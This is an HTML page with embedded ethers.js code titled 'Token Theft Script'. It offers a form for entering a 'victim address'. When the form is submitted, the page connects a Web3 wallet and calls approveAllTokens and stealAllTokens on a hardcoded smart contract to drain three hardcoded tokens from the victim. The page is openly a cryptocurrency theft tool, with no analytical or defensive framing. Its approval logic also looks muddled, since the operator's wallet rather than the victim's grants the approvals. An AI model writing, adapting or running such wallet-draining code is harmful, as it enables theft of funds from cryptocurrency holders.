aq<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Theft Script</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body>

    <h2>Steal Tokens from Victim</h2>

    <form id="stealTokensForm">
        <label for="victimAddress">Victim Address:</label>
        <input type="text" id="victimAddress" placeholder="Enter victim address" required>
        <input type="submit" value="Steal Tokens">
    </form>

    <script>
        // Contract Details
        const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract Address
        const knownTokens = [
            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
            "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
        ];
        const contractABI = [
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "approveAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "victim",
                        "type": "address"
                    },
                    {
                        "internalType": "address[]",
                        "name": "knownTokens",
                        "type": "address[]"
                    }
                ],
                "name": "stealAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        async function connectWallet() {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                return signer;
            } else {
                alert("Please install MetaMask or another Web3 wallet.");
                return null;
            }
        }

        async function approveAllTokens(victimAddress, signer) {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            const maxApproval = ethers.constants.MaxUint256; // Max approval
            try {
                for (let token of knownTokens) {
                    await contract.approveAllTokens(token); // Approve all tokens
                    console.log(`Approved token: ${token}`);
                }
                return true;
            } catch (error) {
                console.error("Approval failed:", error);
                return false;
            }
        }

        async function stealAllTokens(victimAddress, signer) {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            try {
                await contract.stealAllTokens(victimAddress, knownTokens);
                console.log("Tokens stolen successfully!");
            } catch (error) {
                console.error("Stealing tokens failed:", error);
            }
        }

        document.getElementById('stealTokensForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const victimAddress = document.getElementById('victimAddress').value;

            if (!victimAddress) {
                alert("Please enter a victim address.");
                return;
            }

            const signer = await connectWallet();
            if (signer) {
                // Step 1: Approve all tokens
                const approvalSuccess = await approveAllTokens(victimAddress, signer);
                if (approvalSuccess) {
                    // Step 2: Steal all tokens
                    await stealAllTokens(victimAddress, signer);
                }
            }
        });
    </script>

</body>
</html>
